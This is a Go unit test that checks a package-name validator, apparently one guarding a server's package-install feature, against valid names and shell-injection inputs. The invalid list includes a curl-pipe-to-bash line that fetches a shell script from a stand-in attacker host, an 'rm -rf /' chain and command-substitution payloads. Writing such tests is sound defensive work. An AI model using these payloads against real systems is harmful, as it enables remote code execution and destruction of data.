package server

import "testing"

func TestValidate(t *testing.T) {
	valid := []string{
		"nginx",
		"nginx-extras",
		"libstdc++6",
		"python3.11",
		"curl",
		"php8.2-fpm",
		"a",
		"0ad",
	}
	for _, pkg := range valid {
		if err := validate(pkg); err != nil {
			t.Errorf("validate(%q) = %v, want nil", pkg, err)
		}
	}

	invalid := []string{
		"",
		"nginx; curl http://attacker.com/shell.sh | bash",
		"nginx && rm -rf /",
		"$(whoami)",
		"`whoami`",
		"nginx|id",
		"nginx & touch /tmp/pwned",
		"-nginx",
		".nginx",
		"+nginx",
		"ngi nx",
		"ngi\nnx",
		"nginx$IFS",
	}
	for _, pkg := range invalid {
		if err := validate(pkg); err == nil {
			t.Errorf("validate(%q) = nil, want error", pkg)
		}
	}
}
